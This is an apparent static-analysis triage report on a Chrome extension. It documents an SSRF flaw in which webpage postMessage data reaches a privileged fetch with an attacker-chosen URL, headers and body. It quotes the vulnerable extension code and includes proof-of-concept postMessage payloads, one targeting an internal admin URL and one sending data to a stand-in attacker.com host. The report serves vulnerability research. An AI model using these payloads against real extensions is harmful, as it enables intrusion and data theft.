# CoCo Analysis: eogkcfhhgeoapkoinpgkpdggojmobbfe

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5 (1 unique SSRF vulnerability, 4 duplicate fetch_source → window_postMessage detections)

---

## Sink 1: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/eogkcfhhgeoapkoinpgkpdggojmobbfe/opgen_generated_files/cs_0.js
Line 467: window.addEventListener('message',function(e){...
- e
- e.data
- e.data

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/eogkcfhhgeoapkoinpgkpdggojmobbfe/opgen_generated_files/bg.js
Line 965: chrome.runtime.onMessage.addListener(function(request,sender,response){...
- r.data
- r.data.url

**Code:**

```javascript
// Content script (cs_0.js) - Line 467
window.addEventListener('message',function(e){ // ← Attacker can send postMessage from webpage
  if(e.source!=window){return;}
  if(e.data.type && e.data.type=='f.'){
    if(e.data.type){
      aaa('f.',e.data.d); // Forwards attacker-controlled data
    }
  }
  if(e.data.type && e.data.type=='t'){
    aaa(e.data); // ← Forwards entire attacker-controlled event.data
  }
},false);

function aaa(d){
  chrome.runtime.sendMessage(d,function(r){}); // ← Sends to background
}

// Background script (bg.js) - Line 965
chrome.runtime.onMessage.addListener(function(request,sender,response){
  response({status: 'got'});
  if(request.type){
    if(request.type=='t'){
      aad(request); // ← Processes attacker-controlled request
    }else{
      aae(request.t,request.d);
    }
  }
});

function aad(r){
  let aag=new Headers();
  aag.set('Content-Type','application/json');

  if(r.data.user && r.data.password){
    aag.set('Authorization','Basic '+btoa(r.data.user+":"+r.data.password)); // ← Attacker controls auth header
  }

  if(r.data && r.data.uuid){
    var u=r.data.uuid;
    var aah="get";
  }
  if(r.data && r.data.request){
    var u=r.data.request.uuid;
    var aah="post";
  }

  var req=JSON.stringify(r.data.request);

  const aai=new AbortController();
  const aaj=setTimeout(()=>aai.abort(),7000);

  let response=fetch(r.data.url,{ // ← SSRF: Attacker controls URL
    method: aah,
    headers: aag, // ← Attacker controls headers
    signal: aai.signal,
    body: req // ← Attacker controls body
  }).then(function(response){
    if(aah=="get"){
      response.json().then(json=>{
        aaf({type:'r',uuid:u,status:response.status,response:response,json:json});
      });
    }else{
      if(response.status){
        aaf({type:'r',uuid:u,status:response.status,response:response});
      }
    }
  }).catch(function(error){
    aaf({type:'r',uuid:u,status:404,response:response,error:error});
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (content script)

**Attack:**

```javascript
// From any webpage where the content script is injected (matches: "*://*/*")
window.postMessage({
  type: 't',
  data: {
    url: 'https://internal-admin-panel.company.local/delete-user?id=123', // SSRF to internal network
    user: 'admin',
    password: 'admin123',
    request: {
      uuid: 'exploit',
      // Additional malicious data
    }
  }
}, '*');

// Or SSRF to external attacker-controlled server to exfiltrate data
window.postMessage({
  type: 't',
  data: {
    url: 'https://attacker.com/collect',
    request: {
      uuid: 'steal',
      // Extension makes privileged request to attacker server
    }
  }
}, '*');
```

**Impact:** Server-Side Request Forgery (SSRF) vulnerability. An attacker controlling a webpage can force the extension to make arbitrary HTTP requests with extension privileges to any URL, including internal network resources that would normally be inaccessible from the webpage. The attacker can control the URL, HTTP method, headers (including authentication), and request body.

---

## Sink 2-5: fetch_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/eogkcfhhgeoapkoinpgkpdggojmobbfe/opgen_generated_files/bg.js
Line 265: var responseText = 'data_from_fetch';

**Note:** CoCo detected flows from fetch_source to window_postMessage_sink, but these only reference framework code (Line 265 is in the CoCo mock). These are duplicate detections related to the same SSRF vulnerability already documented in Sink 1, where responses from attacker-controlled fetches could be sent back to the webpage via postMessage.

**Classification:** TRUE POSITIVE (part of the same vulnerability chain as Sink 1)

**Reason:** These detections are part of the complete attack chain where the fetch response (from attacker-controlled URL) flows back to the content script via the `aaf()` function and could be sent to the webpage via postMessage, allowing the attacker to read the response.
